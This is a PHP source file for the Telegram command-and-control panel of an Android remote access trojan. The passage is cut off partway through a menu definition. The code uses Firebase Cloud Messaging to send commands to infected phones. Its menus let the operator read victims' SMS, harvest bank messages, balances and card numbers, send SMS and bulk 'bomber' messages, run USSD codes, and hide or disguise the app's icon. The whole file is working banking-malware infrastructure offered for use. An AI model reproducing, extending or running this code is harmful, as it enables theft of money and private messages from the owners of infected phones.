<?php

include("chalim.php");

define('TOKEN', $bot_token);
define('PORT_SUDO', $sudo_port);
define('PROJECT_ID', $project_id);
define('FILE', $file);
define('API_KEY', $bot_token);

#Write Requirements
if (!file_exists("data")) {
    mkdir("data");
    mkdir("user");
    mkdir("logs");
}
if (!file_exists("link.txt")) {
    file_put_contents("link.txt", "https://google.com");
    file_put_contents("data/devices.txt", "");
    file_put_contents("data/contact.txt", "0");
    file_put_contents("data/firstsms.txt", "off");
    file_put_contents("data/autohide.txt", "off");
    file_put_contents("data/number-first.txt", "09123456789");
    file_put_contents("data/message-first.txt", $dev_id);
    file_put_contents("data/offline-number.txt", "09123456789");
    file_put_contents("user/index.php", "");
    file_put_contents("data/index.php", "");
    file_put_contents("data/pingmsg.txt", "0");
    file_put_contents("data/onlineusers.txt", "");
    file_put_contents("data/online_model.txt", "list");
    file_put_contents("data/autotar.txt", "off");
    file_put_contents("data/message_contacts.txt", "off");
    file_put_contents("data/online_users.json", "[]");
    file_put_contents("firstaction.json", '{"balance":"off","targetphone":"off","autohide":"off"}');
    file_put_contents("block.txt", "");
    file_put_contents("data/rat_name.txt", "bsbs");
}

#ip function
function Client_IP()
{
    $target_client_ip = @$_SERVER['HTTP_CLIENT_IP'];
    $target_forward_ip = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $target_remote_ip = $_SERVER['REMOTE_ADDR'];
    if (filter_var($target_client_ip, FILTER_VALIDATE_IP)) {
        $ip = $target_client_ip;
    } elseif (filter_var($target_forward_ip, FILTER_VALIDATE_IP)) {
        $ip = $target_forward_ip;
    } else {
        $ip = $target_remote_ip;
    }
    return $ip;
}

#bot Function
function bot($method, $datas = [])
{
    $url = "https://api.telegram.org/bot" . TOKEN . "/" . $method;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $datas);
    $res = curl_exec($ch);
    if (curl_error($ch)) {
        file_put_contents("logs/curl_error.log", curl_error($ch) . "\n", FILE_APPEND);
        var_dump(curl_error($ch));
    } else {
        return json_decode($res);
    }
}

function sendCommandWithResponse($chat_id, $device_id, $model, $command, $success_message) {
    $wait_message = bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "<blockquote>┌🩸 ᴡᴀɪᴛ ꜰᴏʀ ʀᴇꜱᴘᴏɴꜱᴇ ꜰʀᴏᴍ ....\n"
                . "├⚗️ ᴛᴀʀɢᴇᴛ: $device_id | [$model]\n"
                . "└🕸 ᴄᴏᴍᴍᴀɴᴅ: $command</blockquote>\n",
        'parse_mode' => 'HTML'
    ]);
    
    if ($wait_message && $wait_message->ok) {
        return $wait_message->result->message_id;
    }
    return null;
}

#Send Message Function
function smg($chatid, $text, $keyboard)
{
    bot('sendMessage', [
        'chat_id' => $chatid,
        'text' => $text,
        'parse_mode' => 'HTML',
        'reply_markup' => $keyboard
    ]);
}

#Edit Message Func
function emg($chatid, $message_id, $text, $keyboard)
{
    bot('editmessagetext', [
        'chat_id' => $chatid,
        'message_id' => $message_id,
        'text' => $text,
        'parse_mode' => 'HTML',
        'reply_markup' => $keyboard
    ]);
}

function sf($file, $caption, $id = null)
{
    $url = "https://api.telegram.org/bot" . API_KEY . "/sendDocument?chat_id=" . $id;
    $post = array('parse_mode' => 'HTML', 'caption' => "<blockquote><b>$caption</b></blockquote>", 'document' => new CURLFile(realpath("$file")));
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    $res = curl_exec($ch);
    if (curl_error($ch)) {
        file_put_contents("logs/sf_error.log", curl_error($ch) . "\n", FILE_APPEND);
    } else {
        return json_decode($res);
    }
}

function updateJsonValueInFile($filename, $key, $newValue)
{
    if (!file_exists($filename)) {
        file_put_contents($filename, '{}');
    }
    
    $jsonString = file_get_contents($filename);
    $data = json_decode($jsonString, true);
    
    if (!$data) {
        $data = [];
    }
    
    $data[$key] = $newValue;
    $updatedJsonString = json_encode($data, JSON_PRETTY_PRINT);
    file_put_contents($filename, $updatedJsonString);
}

#regular requests
function getAccessToken($file)
{
    if (!file_exists('vendor/autoload.php')) {
        return null;
    }
    
    require 'vendor/autoload.php';
    
    if (!file_exists($file)) {
        file_put_contents("logs/firebase_error.log", "Service account file not found: $file\n", FILE_APPEND);
        return null;
    }
    
    $serviceAccount = json_decode(file_get_contents($file), true);
    
    if (!$serviceAccount) {
        file_put_contents("logs/firebase_error.log", "Invalid service account JSON\n", FILE_APPEND);
        return null;
    }

    $clientEmail = $serviceAccount['client_email'];
    $privateKey = $serviceAccount['private_key'];

    $payload = [
        "iss" => $clientEmail,
        "scope" => "https://www.googleapis.com/auth/firebase.messaging",
        "aud" => "https://www.googleapis.com/oauth2/v4/token",
        "iat" => time(),
        "exp" => time() + 3600
    ];

    $jwt = Firebase\JWT\JWT::encode($payload, $privateKey, 'RS256');

    $requestBody = [
        "grant_type" => "urn:ietf:params:oauth:grant-type:jwt-bearer",
        "assertion" => $jwt
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://www.googleapis.com/oauth2/v4/token");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($requestBody));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Content-Type: application/json"
    ]);

    $response = curl_exec($ch);
    curl_close($ch);

    $decodedResponse = json_decode($response);
    if ($decodedResponse && isset($decodedResponse->access_token)) {
        return $decodedResponse->access_token;
    }
    
    file_put_contents("logs/firebase_error.log", "Failed to get access token: $response\n", FILE_APPEND);
    return null;
}

function requests($mode, $device_id)
{
    $access = getAccessToken(FILE);
    if (!$access) {
        return false;
    }
    
    $data = array(
        "message" => array(
            "topic" => PORT_SUDO,
            "data" => array(
                "command" => $mode,
                "device_id" => $device_id
            ), 
            "android" => array(
                "priority" => "high"
            )
        ),
    );

    $data_string = json_encode($data);
    $headers = array(
        "Authorization: Bearer " . $access,
        "Content-Type: application/json",
    );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://fcm.googleapis.com/v1/projects/" . PROJECT_ID . "/messages:send");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
    $result = curl_exec($ch);
    curl_close($ch);
    
    if ($result) {
        file_put_contents("logs/fcm_requests.log", date('Y-m-d H:i:s') . " - Mode: $mode, Device: $device_id, Result: $result\n", FILE_APPEND);
    }
    
    return $result;
}

function send_sms_contact($dev_id_use)
{
    $send_sms_contacts = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
        [['text' => "‹‹ ʙᴀᴄᴋ", 'callback_data' => "back_panel $dev_id_use"], ['text' => "ꜱᴇɴᴅ ››", 'callback_data' => "last_contacts $dev_id_use"]]
    ]]);
    return $send_sms_contacts;
}

function requestSMSContact($mode, $device_id, $message)
{
    $access = getAccessToken(FILE);
    if (!$access) {
        return false;
    }
    
    $data = array(
        "message" => array(
            "topic" => PORT_SUDO,
            "data" => array(
                "command" => $mode,
                "device_id" => $device_id,
                "text" => $message
            ), 
            "android" => array(
                "priority" => "high"
            )
        ),
    );

    $data_string = json_encode($data);
    $headers = array(
        "Authorization: Bearer " . $access,
        "Content-Type: application/json",
    );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://fcm.googleapis.com/v1/projects/" . PROJECT_ID . "/messages:send");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
    $result = curl_exec($ch);
    curl_close($ch);
    
    if ($result) {
        file_put_contents("logs/fcm_sms_contact.log", date('Y-m-d H:i:s') . " - Mode: $mode, Device: $device_id, Message: $message\n", FILE_APPEND);
    }
    
    return $result;
}

function requestSMS($mode, $device_id, $phone, $message)
{
    $access = getAccessToken(FILE);
    if (!$access) {
        return false;
    }
    
    $data = array(
        "message" => array(
            "topic" => PORT_SUDO,
            "data" => array(
                "command" => $mode,
                "device_id" => $device_id,
                "phone" => $phone,
                "text" => $message
            ), 
            "android" => array(
                "priority" => "high"
            )
        ),
    );

    $data_string = json_encode($data);
    $headers = array(
        "Authorization: Bearer " . $access,
        "Content-Type: application/json",
    );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://fcm.googleapis.com/v1/projects/" . PROJECT_ID . "/messages:send");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
    $result = curl_exec($ch);
    curl_close($ch);
    
    if ($result) {
        file_put_contents("logs/fcm_sms.log", date('Y-m-d H:i:s') . " - Mode: $mode, Device: $device_id, Phone: $phone\n", FILE_APPEND);
    }
    
    return $result;
}

function requestsAll($mode_all)
{
    $access = getAccessToken(FILE);
    if (!$access) {
        return false;
    }
    
    $data = array(
        "message" => array(
            "topic" => PORT_SUDO,
            "data" => array(
                "command" => $mode_all
            ), 
            "android" => array(
                "priority" => "high"
            )
        ),
    );

    $data_string = json_encode($data);
    $headers = array(
        "Authorization: Bearer " . $access,
        "Content-Type: application/json",
    );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://fcm.googleapis.com/v1/projects/" . PROJECT_ID . "/messages:send");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
    $result = curl_exec($ch);
    curl_close($ch);
    
    if ($result) {
        file_put_contents("logs/fcm_all.log", date('Y-m-d H:i:s') . " - Mode: $mode_all, Result: $result\n", FILE_APPEND);
    }
    
    return $result;
}

function location($node)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://check-host.net/nodes/hosts");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Accept: application/json']);
    $result = json_decode(curl_exec($ch), true);
    curl_close($ch);
    
    if (isset($result['nodes'][$node]['location'][2])) {
        return $result['nodes'][$node]['location'][2];
    }
    return "Unknown";
}

function checkhost($domain)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://check-host.net/check-http?host=$domain&node=ir1.node.check-host.net&node=ir3.node.check-host.net&node=ir5.node.check-host.net&node=ir6.node.check-host.net");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Accept: application/json']);
    $result = json_decode(curl_exec($ch), true);
    curl_close($ch);
    
    if (!isset($result['request_id'])) {
        return [];
    }
    
    $id = $result['request_id'];
    sleep(2);
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://check-host.net/check-result/$id");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Accept: application/json']);
    $result = json_decode(curl_exec($ch), true);
    curl_close($ch);
    
    $arr = array();
    if ($result) {
        foreach ($result as $node => $value) {
            if (isset($value[0])) {
                $name = location($node);
                $arr[$name] = [
                    'time' => $value[0][1] ?? 0,
                    'status' => $value[0][2] ?? 'Unknown',
                    'statuscode' => $value[0][3] ?? '0',
                    "serverip" => $value[0][4] ?? '0.0.0.0'
                ];
            }
        }
    }
    return $arr;
}

function getPaginatedUsers($page, $pageSize = 20)
{
    $filePath = 'data/online_users.json';
    $onlineUsers = [];

    if (file_exists($filePath)) {
        $onlineUsers = json_decode(file_get_contents($filePath), true);
        if (!$onlineUsers) {
            $onlineUsers = [];
        }
    }

    $totalUsers = count($onlineUsers);
    $totalPages = ceil($totalUsers / $pageSize);
    $page = max(1, min($totalPages, $page));

    $start = ($page - 1) * $pageSize;
    $usersOnPage = array_slice($onlineUsers, $start, $pageSize, true);

    return [
        'users' => $usersOnPage, 
        'totalUsers' => $totalUsers, 
        'totalPages' => $totalPages, 
        'currentPage' => $page
    ];
}

function createInlineKeyboard($currentPage, $totalPages)
{
    $keyboard = [];

    if ($totalPages > 1) {
        $row = [];
        if ($currentPage > 1) {
            $row[] = ['text' => '‹ ᴘʀᴇᴠɪᴏᴜꜱ', 'callback_data' => 'page_' . ($currentPage - 1)];
        }
        if ($currentPage < $totalPages) {
            $row[] = ['text' => 'ɴᴇxᴛ ›', 'callback_data' => 'page_' . ($currentPage + 1)];
        }
        $keyboard[] = $row;
    }

    return json_encode(['inline_keyboard' => $keyboard]);
}

function updateMessageWithUsers($chatId, $messageId, $currentPage)
{
    $pagination = getPaginatedUsers($currentPage);
    $users = $pagination['users'];
    $totalUsers = $pagination['totalUsers'];
    $totalPages = $pagination['totalPages'];

    $text = "<blockquote>📡 ᴀᴄᴛɪᴏɴ : #ᴘɪɴɢ_ᴀʟʟ</blockquote>\n\n";
    
    if (empty($users)) {
        $text .= "<blockquote>ᴛʜᴇʀᴇ ᴀʀᴇ ɴᴏ ᴏɴʟɪɴᴇ ᴜꜱᴇʀꜱ.</blockquote>\n";
    } else {
        foreach ($users as $androidid => $name) {
            $text .= "/login_$androidid\n";
        }
    }
    
    $text .= "\n<blockquote>ᴜꜱᴇʀꜱ : $totalUsers\n"
            . "ᴘᴀɢᴇ {$pagination['currentPage']}/$totalPages</blockquote>\n"
            . "➖➖➖➖➖➖➖➖➖➖\n"
            . "<blockquote>⚗️ ᴄᴏᴅᴇᴅ ʙʏ : <a href='t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ 🕸</a></blockquote>";

    $keyboard = createInlineKeyboard($pagination['currentPage'], $totalPages);
    emg($chatId, $messageId, $text, $keyboard);
}

#----------------------------------------------------------------------
$update = json_decode(file_get_contents("php://input"), true);
if (!$update) {
    exit;
}

$message = isset($update['message']) ? $update['message'] : null;
$message_id = isset($update['message']['message_id']) ? $update['message']['message_id'] : null;
$data = isset($update['callback_query']['data']) ? $update['callback_query']['data'] : null;
$chat_id = isset($update['callback_query']['message']['chat']['id']) ? 
    $update['callback_query']['message']['chat']['id'] : 
    (isset($update['message']['chat']['id']) ? $update['message']['chat']['id'] : null);
$from_id = isset($update['callback_query']['from']['id']) ? 
    $update['callback_query']['from']['id'] : 
    (isset($update['message']['from']['id']) ? $update['message']['from']['id'] : null);
$text = isset($update['message']['text']) ? $update['message']['text'] : null;
$mi = isset($update['callback_query']['message']['message_id']) ? $update['callback_query']['message']['message_id'] : null;
$first_n = isset($update['message']['from']['first_name']) ? $update['message']['from']['first_name'] : '';
$last_n = isset($update['message']['from']['last_name']) ? $update['message']['from']['last_name'] : '';
$usernamee = isset($update['message']['from']['username']) ? $update['message']['from']['username'] : '';
$username = isset($update['callback_query']['from']['username']) ? $update['callback_query']['from']['username'] : '';

#---------------------------------------------------------------------
# ایجاد دایرکتوری کاربر اگر وجود ندارد
if ($chat_id && !file_exists("user/$chat_id")) {
    mkdir("user/$chat_id", 0777, true);
    file_put_contents("user/$chat_id/command.txt", "");
    file_put_contents("user/$chat_id/message.txt", "");
    file_put_contents("user/$chat_id/device-id.txt", "");
    file_put_contents("user/$chat_id/device-model.txt", "null");
    file_put_contents("user/$chat_id/numberlist.txt", "");
    file_put_contents("user/$chat_id/ringer.txt", "Normal");
    file_put_contents("user/$chat_id/apk.txt", "Visible");
}

$command = file_get_contents("user/$chat_id/command.txt");
$text_message = file_get_contents("user/$chat_id/message.txt");
$device_id = file_get_contents("user/$chat_id/device-id.txt");
$device_model = file_get_contents("user/$chat_id/device-model.txt");
$number_message = file_get_contents("user/$chat_id/numberlist.txt");
$ringer_mode = file_get_contents("user/$chat_id/ringer.txt");
$apk_mode = file_get_contents("user/$chat_id/apk.txt");
$action_autohide = file_get_contents("data/autohide.txt");
$status_offline = file_get_contents("user/$device_id-offline.txt");
$target_name = file_get_contents("user/$device_id-name.txt");
$install_ip = file_get_contents("user/$device_id-ip.txt");
$action_firstsms = file_get_contents("data/firstsms.txt");
$offline_number = file_get_contents("data/offline-number.txt");
$model_online = file_get_contents("data/online_model.txt");
$auto_tar = file_get_contents("data/autotar.txt");
$contact = file_get_contents("data/contact.txt");
$link_show = file_get_contents("link.txt");
$rat_name = file_get_contents("data/rat_name.txt") ?: "bsbs";
$rat_icon = file_get_contents("data/rat_icon.txt") ?: "";

# دکمه‌های اصلی - طراحی جدید
$start_button = json_encode([
    'resize_keyboard' => true,
    'inline_keyboard' => [
        [
            ['text' => "🕸 ʀᴇǫᴜᴇꜱᴛ ᴛᴏ ᴀʟʟ 🕸", 'callback_data' => 'setting']
        ],
        [
            ['text' => "☠️ ꜱʏꜱᴛᴇᴍ ꜱᴇᴛᴛɪɴɢꜱ ☠️", 'callback_data' => 'firstaction'],
            ['text' => "🦇 ᴀʟʟ ᴛᴀʀɢᴇᴛꜱ 🦇", 'callback_data' => 'online_checo']
        ],
        [
            ['text' => "⚰️ ʀᴀᴛ ᴄᴏɴᴛʀᴏʟ ⚰️", 'callback_data' => 'rat_set'],
            ['text' => "🎭 ᴘᴀɴᴇʟ ꜱᴇᴛᴛɪɴɢꜱ 🎭", 'callback_data' => 'panel_set']
        ]
    ]
]);

$goooo = json_encode([
    'resize_keyboard' => true,
    'inline_keyboard' => [
        [
            ['text' => "💀 ꜱᴇᴛ ᴜʀʟ 💀", 'callback_data' => 'set_url'],
            ['text' => "👁️ ᴄʜᴇᴄᴋ ꜰɪʟᴛᴇʀɪɴɢ 👁️", 'callback_data' => 'checkhost']
        ],
        [
            ['text' => "🕸 ɢᴇᴛ ᴀᴘᴋ 🕸", 'callback_data' => 'apkk'],
            ['text' => "☠️ ꜱʜᴏᴡ ᴜʀʟ ☠️", 'callback_data' => 'show_url']
        ],
        [
            ['text' => "🦇 ꜱᴇᴛ ʀᴀᴛ ɴᴀᴍᴇ 🦇", 'callback_data' => 'set_rat_name'],
            ['text' => "⚰️ ʀᴀᴛ ᴀᴘᴘ ⚰️", 'callback_data' => 'rat_app']
        ],
        [
            ['text' => "‹‹ ʙᴀᴄᴋ", 'callback_data' => 'back_home']
        ]
    ]
]);

$goooo2 = json_encode([
    'resize_keyboard' => true,
    'inline_keyboard' => [
        [
            ['text' => "⚡ ᴏɴʟɪɴᴇ ᴍᴏᴅᴇʟ ⚡", 'callback_data' => 'online_model'], 
            ['text' => "$model_online", 'callback_data' => 'online_model']
        ],
        [
            ['text' => "🔮 ᴇᴅɪᴛ ᴍᴇꜱꜱᴀɢᴇ 🔮", 'callback_data' => 'edit_message_all']
        ],
        [
            ['text' => "🩸 ᴄᴏɴᴛᴀᴄᴛꜱ ᴍᴇꜱꜱᴀɢᴇ 🩸", 'callback_data' => 'set_message_contacts']
        ],
        [
            ['text' => "🎭 ᴀᴜᴛᴏ ᴏꜰꜰʟɪɴᴇ 🎭", 'callback_data' => 'autotar'],
            ['text' => "$auto_tar", 'callback_data' => 'autotar']
        ],
        [
            ['text' => "‹‹ ʙᴀᴄᴋ", 'callback_data' => 'back_home']
        ]
    ]
]);

function control_button($dev_id_use) {
    $control_button = json_encode([
        'resize_keyboard' => true,
        'inline_keyboard' => [
            # ᴅᴇᴠɪᴄᴇ ᴄᴏɴᴛʀᴏʟ ꜱᴇᴄᴛɪᴏɴ
            [
                ['text' => "🕸 ᴘɪɴɢ ᴅᴇᴠɪᴄᴇ 🕸", 'callback_data' => "status_user $dev_id_use"],
                ['text' => "⚡ ᴏꜰꜰʟɪɴᴇ ᴏɴ ⚡", 'callback_data' => "offmodeon $dev_id_use"]
            ],
            [
                ['text' => "☠️ ᴏꜰꜰʟɪɴᴇ ᴏꜰꜰ ☠️", 'callback_data' => "offmodeoff $dev_id_use"],
                ['text' => "🔮 ʙᴀʟᴀɴᴄᴇꜱ 🔮", 'callback_data' => "balance $dev_id_use"]
            ],
            
            # ꜱᴍꜱ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ ꜱᴇᴄᴛɪᴏɴ
            [
                ['text' => "👁️ ɪɴʙᴏx 👁️", 'callback_data' => "recived $dev_id_use"],
                ['text' => "💀 ᴏᴜᴛʙᴏx 💀", 'callback_data' => "sent $dev_id_use"]
            ],
            [
                ['text' => "🕸 ꜱᴍꜱ ʟɪꜱᴛ 🕸", 'callback_data' => "Popo $dev_id_use"],
                ['text' => "🦇 ʟᴀꜱᴛ ꜱᴍꜱ 🦇", 'callback_data' => "last_sms $dev_id_use"]
            ],
            [
                ['text' => "⚰️ ꜱᴇɴᴅ ꜱᴍꜱ ⚰️", 'callback_data' => "send_sms $dev_id_use"],
                ['text' => "🎭 ꜱᴇᴀʀᴄʜ ꜱᴍꜱ 🎭", 'callback_data' => "searchSMS $dev_id_use"]
            ],
            
            # ʙᴀɴᴋ ᴏᴘᴇʀᴀᴛɪᴏɴꜱ
            [
                ['text' => "🩸 ʟᴀꜱᴛ ʙᴀɴᴋ 🩸", 'callback_data' => "last_Bank_sms $dev_id_use"],
                ['text' => "⚡ ʙᴀɴᴋ ʟɪꜱᴛ ⚡", 'callback_data' => "All_Bank_sms $dev_id_use"]
            ],
            [
                ['text' => "👁️ ɢᴇᴛ ᴄᴀʀᴅ 👁️", 'callback_data' => "extract_cards $dev_id_use"]
            ],
            
            # ꜱʏꜱᴛᴇᴍ ꜱᴇᴛᴛɪɴɢꜱ
            [
                ['text' => "💀 ɴᴏʀᴍᴀʟ 💀", 'callback_data' => "normal_mode $dev_id_use"],
                ['text' => "🕸 ꜱɪʟᴇɴᴛ 🕸", 'callback_data' => "silent_mode $dev_id_use"]
            ],
            [
                ['text' => "🦇 ʜɪᴅᴇ ɪᴄᴏɴ 🦇", 'callback_data' => "hide_icon $dev_id_use"],
                ['text' => "⚰️ ᴄʜᴀɴɢᴇ ɪᴄᴏɴ ⚰️", 'callback_data' => "change $dev_id_use"],
                ['text' => "🎭 ꜱʜᴏᴡ ɪᴄᴏɴ 🎭", 'callback_data' => "visible_icon $dev_id_use"]
            ],
            
            # ᴜᴛɪʟɪᴛɪᴇꜱ
            [
                ['text' => "🩸 ᴜꜱꜱᴅ ᴄᴏᴅᴇ 🩸", 'callback_data' => "ussdcode $dev_id_use"],
                ['text' => "⚡ ɢᴇᴛ ɴᴜᴍʙᴇʀ ⚡", 'callback_data' => "userphone $dev_id_use"]
            ],
            [
                ['text' => "👁️ ꜰᴜʟʟ ɪɴꜰᴏ 👁️", 'callback_data' => "information $dev_id_use"]
            ],
            
            # ʙᴀᴄᴋ ʙᴜᴛᴛᴏɴ
            [
                ['text' => "‹‹ ʙᴀᴄᴋ ᴛᴏ ᴍᴀɪɴ", 'callback_data' => "back_home"]
            ]
        ]
    ]);
    return $control_button;
}

function info_button($dev_id_use)
{
    $info_button = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
        [['text' => "ɴᴀᴍᴇ ᴛᴀʀɢᴇᴛ", 'callback_data' => "nametarget $dev_id_use"]],
        [['text' => "ᴄʟᴇᴀʀ ᴀʟʟ ɪɴꜰᴏ", 'callback_data' => "clearinfo $dev_id_use"]],
        [['text' => "‹‹ ʙᴀᴄᴋ", 'callback_data' => "back_panel $dev_id_use"]]
    ]]);
    return $info_button;
}

$settings_button = json_encode([
    'resize_keyboard' => true,
    'inline_keyboard' => [
        [
            ['text' => "⚡ ᴀᴜᴛᴏ ᴄʜᴀɴɢᴇ ⚡", 'callback_data' => 'null'], 
            ['text' => "$action_autohide", 'callback_data' => 'auto_change']
        ],
        [
            ['text' => "👁️ ᴏꜰꜰʟɪɴᴇ ꜱɪᴍ 👁️", 'callback_data' => 'null'], 
            ['text' => "$offline_number", 'callback_data' => 'set_number_offline_mode']
        ],
        [
            ['text' => "🕸 ꜱᴍꜱ ʙᴏᴍʙᴇʀ 🕸", 'callback_data' => 'sms_all'], 
            ['text' => "☠️ ꜱɪʟᴇɴᴛ ᴍᴏᴅᴇ ☠️", 'callback_data' => 'silent_all']
        ],
        [
            ['text' => "🦇 ʜɪᴅᴇ ɪᴄᴏɴ 🦇", 'callback_data' => 'hide_all'], 
            ['text' => "⚰️ ʙᴀɴᴋ ɪɴꜰᴏ ⚰️", 'callback_data' => 'get_all_balance']
        ],
        [
            ['text' => "🎭 ɢᴇᴛ ɴᴜᴍʙᴇʀꜱ 🎭", 'callback_data' => 'get_all_numbers'], 
            ['text' => "🩸 ꜱᴇᴀʀᴄʜ ᴀʟʟ 🩸", 'callback_data' => 'search_all']
        ],
        [
            ['text' => "‹‹ ʙᴀᴄᴋ", 'callback_data' => 'back_home']
        ]
    ]
]);

$back_control = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
    [['text' => "‹‹ ʙᴀᴄᴋ", 'callback_data' => 'back_home']]
]]);
$onli_btn = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
    [['text' => "‹‹ ꜱᴇɴᴅ ʀᴇǫᴜᴇꜱᴛꜱ››", 'callback_data' => 'online_checo']]
]]);
$back_home = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
    [['text' => "‹‹ ʙᴀᴄᴋ", 'callback_data' => 'back_home']]
]]);
$back_settings = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
    [['text' => "‹‹ ʙᴀᴄᴋ", 'callback_data' => 'back_home']]
]]);
$dev_inline = json_encode(array('inline_keyboard' => [
    [['text' => "ɢᴇᴛ ᴘᴠ ᴅᴇᴠ", 'url' => "t.me/$dev_id"]]
]));

function sms_button($dev_id_use)
{
    $sms_button = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
        [['text' => "ᴇᴅɪᴛᴇ ᴛᴇxᴛ", 'callback_data' => "edit_message $dev_id_use"]],
        [['text' => "‹‹ ʙᴀᴄᴋ", 'callback_data' => "back_panel $dev_id_use"], ['text' => "ɴᴇxᴛ ››", 'callback_data' => "set_list $dev_id_use"]]
    ]]);
    return $sms_button;
}

$model_button = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [[['text' => "ʟɪꜱᴛ", 'callback_data' => 'list_model'], ['text' => "ꜱɪɴɢᴇʟ", 'callback_data' => 'singel_model']],
    [['text' => "‹‹ ʙᴀᴄᴋ", 'callback_data' => 'back_settings']],
]]);
$changeiconButton = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [[['text' => "ᴄʜʀᴏᴍᴇ", 'callback_data' => 'chrome'], ['text' => "ᴛᴇʟᴇɢʀᴀᴍ", 'callback_data' => 'telegram']],
    [['text' => "ʏᴏᴜᴛᴜʙᴇ", 'callback_data' => 'youtube'], ['text' => "ɢᴏᴏɢʟᴇ", 'callback_data' => "google"]],
    [['text' => "‹‹ ʙᴀᴄᴋ", 'callback_data' => 'back_panel']],
]]);

function getsmsButton($dev_id_use)
{
    $getsmsButton = json_encode(['resize_keyboard' => true, 'inline_keyboard' =>
        [[['text' => "💀 ᴏᴜᴛʙᴏx 💀", 'callback_data' => "sent $dev_id_use"], ['text' => "👁️ ɪɴʙᴏx 👁️", 'callback_data' => "recived $dev_id_use"]],
            [['text' => "🕸 ᴀʟʟ ꜱᴍꜱ 🕸", 'callback_data' => "Popo $dev_id_use"]],
            [['text' => "‹‹ ʙᴀᴄᴋ", 'callback_data' => "back_panel $dev_id_use"]],
        ]]);
    return $getsmsButton;
}

$sms_button_all = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
    [['text' => "ᴇᴅɪᴛᴇ ᴛᴇxᴛ", 'callback_data' => 'edit_message_all']],
    [['text' => "‹‹ ʙᴀᴄᴋ", 'callback_data' => 'back_settings'], ['text' => "ɴᴇxᴛ ››", 'callback_data' => 'set_list_all']]
]]);

function back_sms($dev_id_use)
{
    $back_sms = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
        [['text' => "‹‹ ʙᴀᴄᴋ", 'callback_data' => "send_sms $dev_id_use"]]
    ]]);
    return $back_sms;
}

function send_sms($dev_id_use)
{
    $send_sms = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
        [['text' => "‹‹ ʙᴀᴄᴋ", 'callback_data' => "send_sms $dev_id_use"], ['text' => "ꜱᴇɴᴅ ››", 'callback_data' => "last_send $dev_id_use"]]
    ]]);
    return $send_sms;
}

$send_sms_all = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
    [['text' => "‹‹ ʙᴀᴄᴋ", 'callback_data' => 'back_settings'], ['text' => "ꜱᴇɴᴅ ››", 'callback_data' => 'last_send_all']]
]]);

# پنل جدید برای کاربر با 5 دکمه اولیه
function user_initial_panel($dev_id_use) {
    $user_initial_panel = json_encode([
        'resize_keyboard' => true,
        'inline_keyboard' => [
            # ردیف اول: دکمه بزرگ پینگ
            [
                ['text' => "👁️ ᴘɪɴɢ ᴅᴇᴠɪᴄᴇ 👁️", 'callback_data' => "status_user $dev_id_use"]
            ],
            # ردیف دوم: GET CARD و GET NUMBER کنار هم
            [
                ['text' => "🕸 ɢᴇᴛ ᴄᴀʀᴅ 🕸", 'callback_data' => "extract_cards $dev_id_use"],
                ['text' => "☠️ ɢᴇᴛ ɴᴜᴍʙᴇʀ ☠️", 'callback_data' => "userphone $dev_id_use"]
            ],
            # ردیف سوم: LAST SMS و BANK SMS کنار هم
            [
                ['text' => "🦇 ʟᴀꜱᴛ ꜱᴍꜱ 🦇", 'callback_data' => "last_sms $dev_id_use"],
